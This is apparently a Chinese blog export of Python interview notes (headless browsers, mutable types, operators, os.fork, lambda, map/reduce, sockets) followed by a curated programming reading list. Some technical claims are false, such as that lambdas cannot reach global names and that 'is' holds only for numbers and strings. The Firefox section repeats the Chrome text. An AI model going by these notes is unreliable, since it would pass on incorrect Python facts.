<p>参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sequence -- 一个序列、迭代器或其他支持迭代对象。</span><br><span class="line">start -- 下标起始位置。</span><br></pre></td></tr></table></figure></p>
<p>返回值</p>
<p><code>返回 enumerate(枚举) 对象。</code></p>
<h3 id="Headless无头浏览器"><a href="#Headless无头浏览器" class="headerlink" title="Headless无头浏览器"></a>Headless无头浏览器</h3><p>无头浏览器即headless browser，是一种没有界面的浏览器。既然是浏览器那么浏览器该有的东西它都应该有，只是看不到界面而已。</p>
<h4 id="Headless-Chrome"><a href="#Headless-Chrome" class="headerlink" title="Headless Chrome"></a>Headless Chrome</h4><p>截止目前最新的Chrome版本在Mac\Linux\Windows上都可以使用headless模式</p>
<p>调用方式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a、使用命令行进行调用</span><br><span class="line"></span><br><span class="line">首先需要把chrome的安装路径添加到系统路径下面，调用方式如下</span><br><span class="line"></span><br><span class="line">chrome --headless http://www.baidu.com</span><br><span class="line"></span><br><span class="line">b、通过selenuim进行调用（目前java\python等主流语言都支持selenuim）</span><br></pre></td></tr></table></figure></p>
<h4 id="Headless-Firefox"><a href="#Headless-Firefox" class="headerlink" title="Headless Firefox"></a>Headless Firefox</h4><p>截止目前最新的Chrome版本在Mac\Linux\Windows上都可以使用headless模式</p>
<p>调用方式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a、使用命令行进行调用</span><br><span class="line">        firefox -headless http://www.baidu.com</span><br><span class="line">b、通过selenuim进行调用</span><br></pre></td></tr></table></figure></p>
<h4 id="PhantomJS"><a href="#PhantomJS" class="headerlink" title="PhantomJS"></a>PhantomJS</h4><p>调用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a、使用命令行进行调用首先在官方网站下载最新的phantomJS版本，并把安装目录的路径添加到系统路径下，然后在命令行打开，使用命令 phantomJS  xx.js url 运行JS脚本。PhantomJS脚本参考：</span><br><span class="line"></span><br><span class="line">b、在nodejs中使用phantomjs，需要用到phantomjs中的一个Child Process模块，介绍在这里http://phantomjs.org/api/child_process/。github已经有对</span><br><span class="line">phantomjs的node支持库，项目地址在这里https://github.com/amir20/phantomjs-node</span><br><span class="line"></span><br><span class="line">c、通过selenuim进行调用(目前已经不支持了)</span><br></pre></td></tr></table></figure>
<h3 id="列出-Python-中可变数据类型和不可变数据类型，并简述原理"><a href="#列出-Python-中可变数据类型和不可变数据类型，并简述原理" class="headerlink" title="列出 Python 中可变数据类型和不可变数据类型，并简述原理"></a>列出 Python 中可变数据类型和不可变数据类型，并简述原理</h3><p>不可变数据类型：数值型、字符串型 string 和元组 tuple。</p>
<p>不允许变量的值发生变化，如果改变了变量的值，相当于是新建了一个对象，而对于相同的值的对象，在内存中则只有一个对象（一个地址），如下图用 id() 方法可以打印对象的id。</p>
<p>可变数据类型：列表 list 和字典 dict。</p>
<p>允许变量的值发生变化，即如果对变量进行 append、+= 等这种操作后，只是改变了变量的值，而不会新建一个对象，变量引用的对象的地址也不会变化，不过对于相同的值的不同对象，在内存中则会存在不同的对象，即每个对象都有自己的地址，相当于内存中对于同值的对象保存了多份，这里不存在引用计数，是实实在在的对象。</p>
<h3 id="常用的几种运算："><a href="#常用的几种运算：" class="headerlink" title="常用的几种运算："></a>常用的几种运算：</h3><p>算述运算：+、-、<em>、/、%、**、//<br>比较运算：==、!=、&lt;&gt;、&gt;、&lt;、&gt;=、&lt;=<br>赋值运算：=、+=、-=、</em>=、/=、%=、**=<br>逻辑运算：and、or、not<br>位运算：与、或、异或、取反、左移、右移<br>成员运算符：in、not in<br>身份运算： is、is not</p>
<ul>
<li>/ 和 // 的区别，/ 是除以结果有小数位，// 整除（向下取整）结果是整数</li>
<li><strong> 符号表示取幂，a</strong>b 返回 a 的 b 次方</li>
<li>is 和 == 的区别<br>Python 中对象包含的三个基本要素，分别是：id（身份标识）、type（数据类型）和 value（值）。</li>
</ul>
<p>== 是 Python 标准操作符中的比较操作符，用来比较判断两个对象的 value（值）是否相等。</p>
<p>is 也被叫做同一性运算符，这个运算符比较判断的是对象间的唯一身份标识，也就是 id 是否相同。</p>
<p>只有数值型和字符串型的情况下，a is b 才为 True，当 a 和 b 是 tuple、list、dict 或 set 型时，a is b 为 False。</p>
<h3 id="怎么样才能让-if-和-else-中的语句都执行"><a href="#怎么样才能让-if-和-else-中的语句都执行" class="headerlink" title="怎么样才能让 if 和 else 中的语句都执行"></a>怎么样才能让 if 和 else 中的语句都执行</h3><p>会编程的人都知道，if-else 语句是相斥执行的，如果满足了 if 中的条件，就不能执行 else 中的内容；如果执行了 else 中的内容，一定不会满足 if 条件，所以 if 和 else 是不会同时执行的。</p>
<p><strong>语句 pid=os.fork()，会为当前进程产生一个子进程并返回两个值，为父进程返回子进程的进程 ID，为子进程返回 0。</strong></p>
<p>把 if 条件设定为 fork 方法返回的值是否为 0，如果设置为等于 0，那么就会出现主程序不满足 if 条件，执行 else 中代码块，子进程满足 if 条件，执行 if 中代码块的情况，这样 if 和 else 中的代码块就都会执行。</p>
<p>通过下面这个小案例证明上述描述：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import os</span><br><span class="line">pid = os.fork()</span><br><span class="line">print(pid)</span><br><span class="line">if pid == 0:</span><br><span class="line"># os.getid()获取当前进程ID</span><br><span class="line">        print(os.getpid())</span><br><span class="line">        print(&apos;hello&apos;)</span><br><span class="line">else:</span><br><span class="line">        print(os.getpid())</span><br><span class="line">        print(&apos;goodbye&apos;)</span><br></pre></td></tr></table></figure></p>
<p>注意：os.fork() 方法只在 Linux、Mac、Unix 系统中才能使用。</p>
<h3 id="递归与循环的区别"><a href="#递归与循环的区别" class="headerlink" title="递归与循环的区别"></a>递归与循环的区别</h3><p>递归与循环是两种不同的解决问题的典型思路。</p>
<h4 id="递归算法："><a href="#递归算法：" class="headerlink" title="递归算法："></a>递归算法：</h4><p>优点：代码简洁、清晰，并且容易验证正确性。（如果你真地理解了算法的话，否则你更晕）<br>缺点：它的运行需要较多次数的函数调用，如果调用层数比较深，需要增加额外的堆栈处理，比如参数传递需要压栈等操作，会对执行效率有一定影响。但是，对于某些问题，如果不使用递归，那将是极端难看的代码。</p>
<h4 id="循环算法："><a href="#循环算法：" class="headerlink" title="循环算法："></a>循环算法：</h4><p>优点：速度快，结构简单。<br>缺点：并不能解决所有的问题。有的问题适合使用递归而不是循环。如果使用循环并不困难的话，最好使用循环。</p>
<h3 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h3><p>必备参数： 必备参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。<br>默认参数： 调用函数时，默认参数的值如果没有传入，则被认为是默认值。<br>不定长参数： 你可能需要一个函数能处理比当初声明时更多的参数。</p>
<h3 id="可变和不可变对象当参数"><a href="#可变和不可变对象当参数" class="headerlink" title="可变和不可变对象当参数"></a>可变和不可变对象当参数</h3><p>不可变对象：字符、数值、无组均为不可变对象，该类型的变量创建后不能修改，修改相当于重新生成一个新的变量。</p>
<p>可变对象：列表、字典为可变对象，该类型的变量创建后可以修改，只是对其内部的元素值更改，变量还是那个变量。</p>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>Lambda 来创建匿名函数 Lambda 只是一个表达式，函数体比def简单很多。Lambda 的主体是一个表达式，而不是一个代码块，仅仅能在 Lambda 表达式中封装有限的逻辑进去。Lambda 函数拥有自己的命名空间，且不能访问自有参数列表之外或全局命名空间里的参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">函数格式：</span><br><span class="line"></span><br><span class="line">函数名 = Lambda 变量:表达式       </span><br><span class="line">举例：</span><br><span class="line">func = lambda a, b: print(a) if a&gt;b else print(b)    </span><br><span class="line">func(10, 3)</span><br><span class="line">输出：</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
<h3 id="对缺省参数的理解？"><a href="#对缺省参数的理解？" class="headerlink" title="对缺省参数的理解？"></a>对缺省参数的理解？</h3><p>缺省参数指的是在调用函数的时候没有传入参数的情况下，调用默认的参数，在调用函数的并且赋值时，所传入的参数会替代默认参数。</p>
<ul>
<li><p>*args 是不定长参数，可以表示输入参数是不确定的，可以是任意多个。例如：参数为列表类型 list 时可以用该值表示。</p>
</li>
<li><p>**kwargs 是关键字参数，赋值的时候是以键 = 值的方式参数是可以任意多对，在定义函数的时候不确定有多少参数会传入，就可以使用这两个参数。例如：参数为字典类型 dict 时可以用该值表示。</p>
</li>
</ul>
<h3 id="map-函数和-reduce-函数？"><a href="#map-函数和-reduce-函数？" class="headerlink" title="map 函数和 reduce 函数？"></a>map 函数和 reduce 函数？</h3><ul>
<li><p>从参数方面讲:<br>map() 包含两个参数，第一个参数是一个函数，第二个是序列（列表或元祖，可迭代对象）。其中，函数（即 map 的第一个参数）可以接受一个或者多个参数。<br>reduce() 第一个参数是函数，第二个是序列（列表或元祖），但是，其函数必须接受两个参数。</p>
</li>
<li><p>从对传进去的数值作用来讲：<br>map() 是将传入的函数依次作用到序列的每个元素，每个元素都是独自被函数“作用”一次。<br>reduce() 是将传入的函数作用在序列的第一个元素得到结果后，把这个结果继续与下一个元素作用（累积计算）。</p>
</li>
</ul>
<h3 id="回调函数，如何通信的？"><a href="#回调函数，如何通信的？" class="headerlink" title="回调函数，如何通信的？"></a>回调函数，如何通信的？</h3><p>回调函数是把函数的指针（地址）作为参数传递给另一个参数，将整个参数当做一个对象，赋值给调用的函数。</p>
<h3 id="hasattr-、getattr-、setattr-函数使用详解？"><a href="#hasattr-、getattr-、setattr-函数使用详解？" class="headerlink" title="hasattr( )、getattr( )、setattr( ) 函数使用详解？"></a>hasattr( )、getattr( )、setattr( ) 函数使用详解？</h3><ul>
<li><p>hasattr(object,name) 函数：<br>判断一个对象里面是否有 name 属性或者 name 方法，返回 bool 值<br>注意：name 要用引号括起来</p>
</li>
<li><p>getattr(object,name[,default]) 函数：<br>获取对象 object 的属性或者方法，如果存在打印出来，不存在打印默认值，默认值可选。注意：如果返回的是对象的方法，则打印的结果是：方法的内存地址，如果需要运行这个方法，可以在后面添加 ()。</p>
</li>
<li><p>setattr(object,name,values) 函数：<br>给对象的属性赋值，若属性不存在，先创建再赋值。</p>
</li>
</ul>
<h3 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h3><p>sk.recv(bufsize[,flag]):接受套接字的数据。数据以字符串形式返回，bufsize指定最多可以接收的数量。flag提供有关消息的其他信息，通常可以忽略。</p>
<p>sk.recvfrom(bufsize[.flag]):与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</p>
<p>sk.getsockname():返回套接字自己的地址。通常是一个元组(ipaddr,port)</p>
<p>sk.connect(address):连接到address处的套接字。一般，address的格式为元组（hostname,port）,如果连接出错，返回socket.error错误。</p>
<p>sk.listen(backlog):开始监听传入连接。backlog指定在拒绝连接之前，可以挂起的最大连接数量。</p>
<h3 id="虚数与实数"><a href="#虚数与实数" class="headerlink" title="虚数与实数"></a>虚数与实数</h3><p>1 虚数不能单独存在，它们总是和一个值为 0.0 的实数部分一起来构成一个复数。<br>2复数由实数部分和虚数部分构成<br>3表示虚数的语法： real+imagj<br>4 实数部分和虚数部分都是浮点数<br>5 虚数部分必须有后缀 j 或 J</p>
<h3 id="Python-yield-使用浅析"><a href="#Python-yield-使用浅析" class="headerlink" title="Python yield 使用浅析"></a>Python yield 使用浅析</h3><p>带有 yield 的函数在 Python 中被称之为 generator（生成器）<br><a href="https://www.runoob.com/w3cnote/python-yield-used-analysis.html" target="_blank" rel="noopener">参考资料</a></p>
<h3 id="python-内置函数"><a href="#python-内置函数" class="headerlink" title="python 内置函数"></a>python 内置函数</h3><p><a href="https://blog.csdn.net/weixin_39358657/article/details/89600716" target="_blank" rel="noopener">Python内置函数详解</a></p>
<h3 id="Python的闭包函数"><a href="#Python的闭包函数" class="headerlink" title="Python的闭包函数"></a>Python的闭包函数</h3><h3 id="什么是主从同步"><a href="#什么是主从同步" class="headerlink" title="什么是主从同步"></a>什么是主从同步</h3><p>HDFS</p>
<p>HBase</p>
<h3 id="Xpath-与正则"><a href="#Xpath-与正则" class="headerlink" title="Xpath 与正则"></a>Xpath 与正则</h3><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>应用实例：</p>
<h3 id="twisted-框架-与python-框架"><a href="#twisted-框架-与python-框架" class="headerlink" title="twisted 框架 与python 框架"></a>twisted 框架 与python 框架</h3><h4 id="爬虫框架有哪些"><a href="#爬虫框架有哪些" class="headerlink" title="爬虫框架有哪些"></a>爬虫框架有哪些</h4><h3 id="python中的多进程与多线程"><a href="#python中的多进程与多线程" class="headerlink" title="python中的多进程与多线程"></a>python中的多进程与多线程</h3><h3 id="selenium-phantomjs"><a href="#selenium-phantomjs" class="headerlink" title="selenium + phantomjs"></a>selenium + phantomjs</h3><h3 id="python分批读取数据"><a href="#python分批读取数据" class="headerlink" title="python分批读取数据"></a>python分批读取数据</h3><h3 id="新式类、经典类区别"><a href="#新式类、经典类区别" class="headerlink" title="新式类、经典类区别"></a>新式类、经典类区别</h3><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><h3 id="python-中的可变类型与不可变类型"><a href="#python-中的可变类型与不可变类型" class="headerlink" title="python 中的可变类型与不可变类型"></a>python 中的可变类型与不可变类型</h3><h3 id="类方法、类实例方法、静态方法"><a href="#类方法、类实例方法、静态方法" class="headerlink" title="类方法、类实例方法、静态方法"></a>类方法、类实例方法、静态方法</h3><h3 id="python-的内存管理、内存调优手段、内存泄漏处理"><a href="#python-的内存管理、内存调优手段、内存泄漏处理" class="headerlink" title="python 的内存管理、内存调优手段、内存泄漏处理"></a>python 的内存管理、内存调优手段、内存泄漏处理</h3><h3 id="装饰器与重载"><a href="#装饰器与重载" class="headerlink" title="装饰器与重载"></a>装饰器与重载</h3><h3 id="生成器与迭代器"><a href="#生成器与迭代器" class="headerlink" title="生成器与迭代器"></a>生成器与迭代器</h3><h3 id="值传递、引用传递"><a href="#值传递、引用传递" class="headerlink" title="值传递、引用传递"></a>值传递、引用传递</h3><h3 id="缺省参数"><a href="#缺省参数" class="headerlink" title="缺省参数"></a>缺省参数</h3><h3 id="回调参数"><a href="#回调参数" class="headerlink" title="回调参数"></a>回调参数</h3><h3 id="hasattr-gatattr-setattr"><a href="#hasattr-gatattr-setattr" class="headerlink" title="hasattr() gatattr() setattr()"></a>hasattr() gatattr() setattr()</h3><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><h3 id="yield、generator、iterator"><a href="#yield、generator、iterator" class="headerlink" title="yield、generator、iterator"></a>yield、generator、iterator</h3>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>左耳朵大叔介绍的书籍、文章、网站</title>
    <url>/%E5%B7%A6%E8%80%B3%E6%9C%B5%E5%A4%A7%E5%8F%94%E4%BB%8B%E7%BB%8D%E7%9A%84%E4%B9%A6%E7%B1%8D%E3%80%81%E6%96%87%E7%AB%A0%E3%80%81%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h3 id="程序员练级攻略（2018）"><a href="#程序员练级攻略（2018）" class="headerlink" title="程序员练级攻略（2018）"></a>程序员练级攻略（2018）</h3><ul>
<li><a href="http://norvig.com/21-days.html" target="_blank" rel="noopener">《Teach Yourself Programming in Ten Years》</a></li>
<li><a href="https://liuyandong.com/2017/10/25/122/" target="_blank" rel="noopener">(中文版)十年学会编程</a></li>
<li><a href="http://blog.thefirehoseproject.com/posts/learn-to-code-and-be-self-reliant/" target="_blank" rel="noopener">“ The Key To Accelerating Your Coding Skills”</a>：快速提高自己的编程能力</li>
<li><a href="https://coolshell.cn/articles/4235.html" target="_blank" rel="noopener">《程序员的荒谬之言还是至理名言？》</a><h4 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h4></li>
<li>一定要坚持，要保持长时间学习，甚至终生学习的态度。</li>
<li>一定要动手，不管例子多么简单，建议至少自己动手敲一遍看看是否理解了里头的细枝末节。</li>
<li>一定要学会思考，思考为什么要这样，而不是那样。还要举一反三地思考。</li>
<li>不要乱买书，不要乱追新技术新名词，基础的东西经过很长时间积累，会在未来至少10年通用。</li>
<li>回顾一下历史，看看历史时间线上技术的发展，你才能明白明天会是什么样的。<a id="more"></a>
<h4 id="程序员的修养"><a href="#程序员的修养" class="headerlink" title="程序员的修养"></a>程序员的修养</h4></li>
<li><a href="https://www.quora.com/What-are-some-of-the-most-basic-things-every-programmer-should-know" target="_blank" rel="noopener">What are some of the most basic things every programmer should know?</a></li>
<li><a href="https://97-things-every-x-should-know.gitbooks.io/97-things-every-programmer-should-know/content/en/index.html" target="_blank" rel="noopener">《97 Things Every Programmer Should Know》</a><h4 id="在线编程入门的网站"><a href="#在线编程入门的网站" class="headerlink" title="在线编程入门的网站"></a>在线编程入门的网站</h4></li>
<li><a href="https://www.codecademy.com/learn" target="_blank" rel="noopener">Codecademy: Learn Python</a></li>
<li><a href="https://www.peoplecanprogram.com/" target="_blank" rel="noopener">People Can Program</a></li>
<li><a href="http://www.codeabbey.com/index/task_list" target="_blank" rel="noopener">CodeAbbey 编程练习</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web" target="_blank" rel="noopener">Mozilla Developer Network 的 Web开发入门</a><h4 id="入门学习JavaScript"><a href="#入门学习JavaScript" class="headerlink" title="入门学习JavaScript"></a>入门学习JavaScript</h4></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript" target="_blank" rel="noopener">MDN JavaScript教程</a></li>
<li><a href="http://www.w3school.com.cn/js/" target="_blank" rel="noopener">W3School JavaScript教程 </a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000" target="_blank" rel="noopener">JavaScript全栈教程（廖雪峰） </a><h4 id="前后端"><a href="#前后端" class="headerlink" title="前后端"></a>前后端</h4></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">CSS文档 </a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML" target="_blank" rel="noopener">HTML文档</a></li>
<li><a href="https://www.w3schools.com/js/js_htmldom.asp" target="_blank" rel="noopener">W3Schools的JavaScript HTML DOM的教程</a></li>
<li><a href="http://www.w3school.com.cn/php/index.asp" target="_blank" rel="noopener">W3School的PHP教程</a></li>
<li><a href="http://php.net/manual/zh/" target="_blank" rel="noopener">PHP的官网文档</a><h4 id="写代码的修养"><a href="#写代码的修养" class="headerlink" title="写代码的修养"></a>写代码的修养</h4></li>
<li>《重构：改善既有代码的设计》</li>
<li>《修改代码的艺术》</li>
<li>《代码整洁之道》</li>
<li><p>《程序员的职业素养》</p>
<h5 id="不错的Code-Review的文章"><a href="#不错的Code-Review的文章" class="headerlink" title="不错的Code Review的文章"></a>不错的Code Review的文章</h5></li>
<li><p><a href="https://medium.com/@palantir/code-review-best-practices-19e02780015f" target="_blank" rel="noopener">Code Review Best Practices</a>.</p>
</li>
<li><a href="https://dzone.com/articles/how-google-does-code-review" target="_blank" rel="noopener">How Google Does Code Review</a></li>
<li><a href="https://thenewstack.io/linkedin-code-review/" target="_blank" rel="noopener">LinkedIn’s Tips for Highly Effective Code Review</a><h5 id="Unit-Test的不错文章"><a href="#Unit-Test的不错文章" class="headerlink" title="Unit Test的不错文章"></a>Unit Test的不错文章</h5></li>
<li><a href="https://stackify.com/unit-testing-basics-best-practices/" target="_blank" rel="noopener">You Still Don’t Know How to Do Unit Testing</a></li>
<li><a href="https://dzone.com/articles/unit-testing-best-practices" target="_blank" rel="noopener">Unit Testing Best Practices: JUnit Reference Guide</a></li>
<li><a href="http://www.kyleblaney.com/junit-best-practices/" target="_blank" rel="noopener">JUnit Best Practices</a><h5 id="学习JUnit"><a href="#学习JUnit" class="headerlink" title="学习JUnit"></a>学习JUnit</h5></li>
<li><a href="https://junit.org/junit5/docs/current/user-guide/" target="_blank" rel="noopener">JUnit User Guide(官网)</a></li>
<li><a href="http://sjyuan.cc/junit5/user-guide-cn/" target="_blank" rel="noopener">中文版(官网)</a></li>
</ul>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="编程的IDE"><a href="#编程的IDE" class="headerlink" title="编程的IDE"></a>编程的IDE</h5><ul>
<li><a href="http://www.runoob.com/eclipse/eclipse-tutorial.html" target="_blank" rel="noopener">Eclipse（教程）</a></li>
<li><a href="https://www.gitbook.com/book/dancon/intellij-idea/details" target="_blank" rel="noopener">Intellij IDEA（教程）</a></li>
<li><a href="https://www.gitbook.com/book/jeasonstudio/vscode-cn-doc/details" target="_blank" rel="noopener">Visual Studio Code</a><h5 id="版本管理工具"><a href="#版本管理工具" class="headerlink" title="版本管理工具"></a>版本管理工具</h5></li>
<li><a href="https://git-scm.com/book/zh/v2/" target="_blank" rel="noopener">Pro Git 第二版 </a>：非常系统,首选</li>
<li><a href="https://backlog.com/git-tutorial/cn/" target="_blank" rel="noopener">猴子都能懂的Git入门</a></li>
<li>Git环境安装和准备以及GitHub使用：</li>
<li><ul>
<li><a href="https://github.com/JiapengLi/GitTutorial" target="_blank" rel="noopener">Github and Git 图文教程 </a></li>
</ul>
</li>
<li><ul>
<li><a href="https://www.jianshu.com/p/1b65ed31da97" target="_blank" rel="noopener">Git图文教程及详解</a><h5 id="调试前端程序"><a href="#调试前端程序" class="headerlink" title="调试前端程序"></a>调试前端程序</h5><a href="http://www.igeekbar.com/igeekbar/post/156.htm" target="_blank" rel="noopener"> 超完整的Chrome浏览器客户端调试大全</a><h5 id="数据库设计工具"><a href="#数据库设计工具" class="headerlink" title="数据库设计工具"></a>数据库设计工具</h5><a href="https://dev.mysql.com/doc/refman/5.7/en/" target="_blank" rel="noopener">MySQL WorkBench官方文档</a></li>
</ul>
</li>
</ul>
<h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><ul>
<li><a href="https://www.owasp.org/index.php/Main_Page" target="_blank" rel="noopener">OWASP - Open Web Application Security Project</a><h5 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h5></li>
<li><a href="https://www.keycdn.com/blog/http-security-headers/" target="_blank" rel="noopener">《Hardening Your HTTP Security Headers》</a><h5 id="安全编程"><a href="#安全编程" class="headerlink" title="安全编程"></a>安全编程</h5></li>
<li><a href="https://security.berkeley.edu/secure-coding-practice-guidelines" target="_blank" rel="noopener">伯克立大学的Secure Coding Practice Guidelines</a></li>
<li><a href="https://wiki.sei.cmu.edu/confluence/display/seccode/SEI+CERT+Coding+Standards" target="_blank" rel="noopener">卡内基梅隆大学的 SEI CERT Coding Standards</a><h5 id="防御性编程-维基百科"><a href="#防御性编程-维基百科" class="headerlink" title="防御性编程(维基百科)"></a><a href="https://en.wikipedia.org/wiki/Defensive_programming" target="_blank" rel="noopener">防御性编程(维基百科)</a></h5></li>
<li><a href="https://medium.com/web-engineering-vox/the-art-of-defensive-programming-6789a9743ed4" target="_blank" rel="noopener">The Art of Defensive Programming</a></li>
<li><a href="https://medium.com/@cvitullo/overly-defensive-programming-e7a1b3d234c2" target="_blank" rel="noopener">Overly defensive programming</a><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
<li><a href="https://book.douban.com/subject/4187479/" target="_blank" rel="noopener">《完美软件：对软件测试的各种幻想》</a></li>
<li><a href="https://book.douban.com/subject/25742200/" target="_blank" rel="noopener">《Google软件测试之道》</a><h4 id="上线Checklist"><a href="#上线Checklist" class="headerlink" title="上线Checklist"></a>上线Checklist</h4></li>
<li><a href="https://github.com/mtdvio/going-to-production/blob/master/serverside-checklist.md" target="_blank" rel="noopener">Server Side checklist</a></li>
<li><a href="https://github.com/mtdvio/going-to-production/blob/master/spa-checklist.md" target="_blank" rel="noopener">Single Page App Checklist</a><h4 id="运维方面的入门文章"><a href="#运维方面的入门文章" class="headerlink" title="运维方面的入门文章"></a>运维方面的入门文章</h4></li>
<li><a href="https://www.datadoghq.com/blog/monitoring-101-collecting-data/" target="_blank" rel="noopener">《Monitoring 101》</a>:告诉你最基本的监控线上运行软件的方法和实践。</li>
</ul>
<h4 id="各种语言的编程规范"><a href="#各种语言的编程规范" class="headerlink" title="各种语言的编程规范"></a>各种语言的编程规范</h4><ul>
<li><a href="http://note.youdao.com/noteshare?id=db702a4a94b411c75f42957611a54233&amp;sub=wcp1534430224807260" target="_blank" rel="noopener">各种语言的编程规范</a></li>
</ul>
<h3 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h3><h4 id="Java语言"><a href="#Java语言" class="headerlink" title="Java语言"></a>Java语言</h4><ul>
<li><a href="https://book.douban.com/subject/26880667/" target="_blank" rel="noopener">《Java核心技术：卷1基础知识》</a></li>
<li><a href="https://book.douban.com/subject/26767354/" target="_blank" rel="noopener">《Spring实战》</a></li>
<li><a href="https://book.douban.com/subject/26857423/" target="_blank" rel="noopener">《Spring Boot实战》</a></li>
<li><a href="https://book.douban.com/subject/27047716/" target="_blank" rel="noopener">《Effective Java》</a></li>
<li><a href="https://github.com/google/guava" target="_blank" rel="noopener"> Google Guava 库</a></li>
<li><a href="https://book.douban.com/subject/10484692/" target="_blank" rel="noopener">《Java并发编程实战》</a></li>
<li><a href="https://book.douban.com/subject/26740520/" target="_blank" rel="noopener">《Java性能权威指南》</a></li>
<li><a href="https://book.douban.com/subject/24722612/" target="_blank" rel="noopener">《深入理解Java虚拟机》</a></li>
<li><a href="https://book.douban.com/subject/2130190/" target="_blank" rel="noopener">《Java编程思想》</a></li>
<li><a href="https://book.douban.com/subject/26952826/" target="_blank" rel="noopener">《精通Spring 4.x》</a></li>
<li><a href="https://book.douban.com/subject/1052241/" target="_blank" rel="noopener">《设计模式》</a></li>
<li><a href="https://book.douban.com/subject/2243615/" target="_blank" rel="noopener">《Head First设计模式》</a></li>
</ul>
<h4 id="C-C-语言"><a href="#C-C-语言" class="headerlink" title="C/C++语言"></a>C/C++语言</h4><ul>
<li><a href="https://book.douban.com/subject/1139336/" target="_blank" rel="noopener">《C程序设计语言》C语言之父Dennis M. Ritchie和著名科学家Brian W. Kernighan</a></li>
<li><a href="https://book.douban.com/subject/2280547/" target="_blank" rel="noopener">《C语言程序设计现代方法》</a></li>
<li><a href="https://book.douban.com/subject/2778632/" target="_blank" rel="noopener">《C陷阱与缺陷》</a></li>
<li><a href="https://coolshell.cn/articles/7992.html" target="_blank" rel="noopener">“C++的坑真的多吗？”</a></li>
<li><a href="https://book.douban.com/subject/25708312/" target="_blank" rel="noopener">《C++ Primer中文版》</a></li>
<li><a href="https://book.douban.com/subject/5387403/" target="_blank" rel="noopener">《Effective C++》</a></li>
<li><a href="https://book.douban.com/subject/5908727/" target="_blank" rel="noopener">《More Effective C++》</a></li>
<li><a href="https://book.douban.com/subject/10427315/" target="_blank" rel="noopener">《深度探索C++对象模型》</a></li>
<li><a href="https://coolshell.cn/articles/12165.html" target="_blank" rel="noopener">《C++虚函数表解析》</a></li>
<li><a href="https://coolshell.cn/articles/12176.html" target="_blank" rel="noopener">《C++对象内存布局》</a></li>
<li><a href="http://www.stroustrup.com/bs_faq.html" target="_blank" rel="noopener"> 《C++ FAQ》Bjarne Stroustrup </a></li>
<li><a href="http://www.stroustrup.com/bsfaqcn.html" target="_blank" rel="noopener">《C++ FAQ》(中文版)</a></li>
</ul>
<h4 id="Go语言"><a href="#Go语言" class="headerlink" title="Go语言"></a>Go语言</h4><ul>
<li><a href="https://gobyexample.com/" target="_blank" rel="noopener"> Go by Example</a>：入门</li>
<li><a href="https://go101.org/article/101.html" target="_blank" rel="noopener">Go 101</a></li>
<li><a href="https://book.douban.com/subject/26337545/" target="_blank" rel="noopener">The Go Programming Language</a></li>
<li><a href="https://coolshell.cn/articles/8460.html" target="_blank" rel="noopener"> “GO 语言简介（上）- 语法”</a>：参考</li>
<li><a href="https://coolshell.cn/articles/8489.html" target="_blank" rel="noopener"> “GO 语言简介（下）- 特性”</a>：参考</li>
<li><a href="https://golang.org/doc/effective_go.html" target="_blank" rel="noopener"> Effective Go</a>：必读</li>
<li><a href="https://github.com/golang/go/wiki/Articles" target="_blank" rel="noopener">Go精华文章列表(Github)</a></li>
<li><a href="https://github.com/golang/go/wiki/Blogs" target="_blank" rel="noopener">Go相关博客列表(Github)</a></li>
<li><a href="https://github.com/golang/go/wiki/GoTalks" target="_blank" rel="noopener">Go Talks(Github)</a></li>
<li><a href="https://github.com/avelino/awesome-go" target="_blank" rel="noopener">Go资源列表 Awesome Go(Github)</a></li>
</ul>
<h3 id="理论学科"><a href="#理论学科" class="headerlink" title="理论学科"></a>理论学科</h3><p>算法、数据结构、网络模型、计算机原理等这样的计算机科学专业需要学习的理论知识是必须要学习的</p>
<h4 id="数据结构和算法"><a href="#数据结构和算法" class="headerlink" title="数据结构和算法"></a>数据结构和算法</h4><h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><ul>
<li><a href="https://book.douban.com/subject/10432347/" target="_blank" rel="noopener">《算法》</a></li>
<li><a href="https://book.douban.com/subject/26979890/" target="_blank" rel="noopener">《算法图解》</a></li>
</ul>
<h5 id="理论加持"><a href="#理论加持" class="headerlink" title="理论加持"></a>理论加持</h5><ul>
